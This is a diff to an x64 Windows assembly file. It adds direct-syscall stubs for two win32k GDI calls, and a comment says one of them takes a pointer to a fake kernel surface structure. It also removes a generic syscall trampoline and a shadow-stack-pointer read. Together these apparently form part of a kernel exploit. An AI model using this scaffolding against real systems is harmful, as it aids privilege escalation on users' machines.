@@ -1,22 +1,36 @@
+PUBLIC EngCreateBitmapSyscall
+PUBLIC NtGdiEngCreateDeviceBitmapSyscall
 
+_TEXT SEGMENT
 
-.code
+; x64 Windows syscall ABI:
+; rcx = arg1 -- MUST be saved to r10 before syscall (syscall clobbers rcx with RIP)
+; rdx = arg2
+; r8  = arg3
+; r9  = arg4
+; The kernel restores arg1 from R10.
 
-do_syscall_4 PROC
-    mov     r11, rdx
-    mov     eax, ecx
-    mov     r10, r8
-    mov     rdx, r9
-    mov     r8,  [rsp + 28h]
-    mov     r9,  [rsp + 30h]
-    jmp     r11
-do_syscall_4 ENDP
-
-
-aida_read_ssp PROC
-    xor     rax, rax
-    db      0F3h, 048h, 00Fh, 01Eh, 0C8h
+; NtGdiEngCreateBitmap — syscall 0x127C (SSDT index 636 + win32k base 0x1000)
+; HBITMAP NtGdiEngCreateBitmap(SIZEL sizl, LONG lDelta, ULONG iFormat, FLONG fl, PVOID pvBits)
+EngCreateBitmapSyscall PROC
+    mov r10, rcx
+    mov eax, 127Ch
+    syscall
     ret
-aida_read_ssp ENDP
+EngCreateBitmapSyscall ENDP
+
+; NtGdiEngCreateDeviceBitmap — syscall 0x127E (SSDT index 638 + win32k base 0x1000)
+; HBITMAP NtGdiEngCreateDeviceBitmap(DHSURF dhsurf, SIZEL sizl, ULONG iFormatCompat)
+;   rcx = dhsurf  (user-mode pointer to fake DHSURF structure)
+;   rdx = sizl    (SIZEL packed as QWORD: cx in low DWORD, cy in high DWORD)
+;   r8  = iFormatCompat (6 = BMF_32BPP, must be 1-8)
+NtGdiEngCreateDeviceBitmapSyscall PROC
+    mov r10, rcx
+    mov eax, 127Eh
+    syscall
+    ret
+NtGdiEngCreateDeviceBitmapSyscall ENDP
+
+_TEXT ENDS
 
 END
